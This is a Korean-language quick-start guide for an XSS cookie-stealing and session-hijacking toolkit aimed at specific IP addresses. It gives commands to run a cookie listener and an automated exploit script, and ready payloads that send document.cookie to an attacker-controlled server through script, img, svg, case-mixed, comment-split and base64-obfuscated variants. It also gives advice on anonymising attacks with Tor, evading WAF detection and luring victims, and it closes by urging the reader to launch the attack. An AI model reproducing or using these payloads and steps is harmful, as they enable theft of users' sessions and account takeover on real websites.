# 빠른 시작 가이드 - XSS 쿠키 탈취

## 🚀 3단계로 시작하기

### Step 1: 쿠키 리스너 서버 시작 (3.113.201.239에서 실행)

```bash
# SSH로 리스너 서버 접속
ssh user@3.113.201.239

# 쿠키 리스너 실행
cd /path/to/xss우회
python3 cookie_listener.py

# 실행 결과:
# 🎯 Cookie Listener Server Started
# 📡 Listening on: http://0.0.0.0:8888
# 🔗 Webhook URL: http://3.113.201.239:8888/steal
```

### Step 2: XSS 공격 실행 (로컬에서 실행)

```bash
# 방법 1: 전체 자동화 실행
./run_full_attack.sh

# 방법 2: 수동 실행
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal \
  -m POST \
  -p content
```

### Step 3: 세션 하이재킹

```bash
# 쿠키가 수집되면 자동으로 세션 하이재킹 진행
# 또는 수동으로:
python3 session_hijacker.py -t http://3.34.90.201/index.php
```

---

## 📝 실전 예제

### 예제 1: 댓글 기능 XSS 공격

**타겟**: `http://3.34.90.201/add_comment.php`

```bash
# 1. 리스너 서버 시작 (3.113.201.239)
python3 cookie_listener.py &

# 2. 공격 실행 (로컬)
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal \
  -m POST \
  -p content \
  -d 2

# 3. 피해자가 댓글을 볼 때 쿠키 탈취됨

# 4. 탈취한 쿠키로 로그인
python3 session_hijacker.py -t http://3.34.90.201/profile.php
```

### 예제 2: 검색 기능 XSS 공격 (GET 방식)

**타겟**: `http://3.34.90.201/search.php`

```bash
python3 auto_exploit.py \
  -t http://3.34.90.201/search.php \
  -l http://3.113.201.239:8888/steal \
  -m GET \
  -p query
```

### 예제 3: Tor를 통한 익명 공격

```bash
# Tor 시작
tor &

# Tor 프록시 사용
python3 auto_exploit.py \
  -t http://3.34.90.201/add_comment.php \
  -l http://3.113.201.239:8888/steal
  # 기본적으로 Tor 사용됨
```

---

## 🎯 수동 페이로드 테스트

서버에 직접 페이로드를 주입하려면:

### 1. 기본 쿠키 탈취 페이로드

```html
<script>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</script>
```

### 2. 필터 우회 페이로드들

```html
<!-- 이미지 태그 -->
<img src=x onerror="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">

<!-- SVG -->
<svg/onload="fetch('http://3.113.201.239:8888/steal?c='+document.cookie)">

<!-- 대소문자 혼용 -->
<ScRiPt>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</sCrIpT>

<!-- 주석 분할 -->
<scr<!---->ipt>fetch('http://3.113.201.239:8888/steal?c='+document.cookie)</scr<!---->ipt>

<!-- Base64 인코딩 -->
<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly8zLjExMy4yMDEuMjM5Ojg4ODgvc3RlYWw/Yz0nK2RvY3VtZW50LmNvb2tpZSk='))">
```

### 3. 테스트 방법

1. 브라우저 개발자 도구 콘솔에서:
```javascript
fetch('http://3.113.201.239:8888/steal?c='+document.cookie)
```

2. 페이로드를 댓글/게시글에 직접 입력

3. Burp Suite로 요청 수정

---

## 🔍 문제 해결

### 문제 1: Tor 연결 실패

```bash
# Tor 상태 확인
ps aux | grep tor

# Tor 재시작
killall tor
tor &

# Tor 없이 실행
python3 auto_exploit.py ... --no-tor
```

### 문제 2: 쿠키 리스너 접근 안됨

```bash
# 방화벽 확인 (3.113.201.239)
sudo ufw status
sudo ufw allow 8888/tcp

# AWS 보안 그룹 확인
# - Inbound: TCP 8888, Source: 0.0.0.0/0

# 리스너 로그 확인
tail -f listener.log
```

### 문제 3: 세션 하이재킹 실패

```bash
# 쿠키 목록 확인
python3 session_hijacker.py --list

# 쿠키 파일 직접 확인
cat stolen_cookies/cookie_*.json

# HttpOnly 플래그 확인 (JavaScript로 접근 불가)
# → 이 경우 다른 공격 벡터 필요
```

---

## 📊 성공 지표

### 쿠키 탈취 성공
```
✓ Cookie Stolen!
   Cookie: PHPSESSID=abc123...
   IP: 203.0.113.45
```

### 세션 하이재킹 성공
```
✓ Session Hijack Successful!
Found indicators: logout, profile, dashboard
```

### 로그 파일
- `stolen_cookies/` - 탈취한 쿠키
- `exploit_results.json` - 공격 결과
- `hijacked_session.json` - 하이재킹 정보
- `hijacked_page.html` - 하이재킹된 페이지

---

## 🎓 다음 단계

1. **페이로드 커스터마이징**
   - `payload_generator.py` 수정
   - 타겟 환경에 맞는 페이로드 추가

2. **자동화 개선**
   - 쿠키 탈취 후 자동 알림
   - 여러 타겟 동시 공격
   - 재시도 로직 추가

3. **은밀성 향상**
   - 페이로드 난독화 강화
   - 트래픽 패턴 랜덤화
   - 시간 지연 실행

---

## 🛡️ 실전 팁

### 1. WAF 탐지 회피
- 요청 간 지연 시간 늘리기 (`-d 5`)
- User-Agent 변경
- Tor IP 주기적 변경

### 2. 성공률 높이기
- 여러 페이로드 동시 시도
- 다양한 주입 포인트 테스트
- 타겟 필터링 규칙 사전 조사

### 3. 쿠키 탈취 확률 높이기
- 소셜 엔지니어링 (피해자 유도)
- XSS 위치: 자주 방문하는 페이지
- 지속성: Stored XSS > Reflected XSS

---

**준비 완료! 공격을 시작하세요!**

```bash
./run_full_attack.sh
```
